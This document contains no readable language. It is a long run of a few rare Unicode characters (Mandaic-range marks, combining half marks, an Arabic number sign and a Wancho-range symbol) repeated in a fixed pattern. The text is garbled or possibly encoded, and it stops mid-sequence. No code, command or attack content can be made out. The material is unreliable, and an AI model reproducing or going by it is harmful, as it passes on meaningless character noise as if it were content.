࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛𞋬𞋬𞋬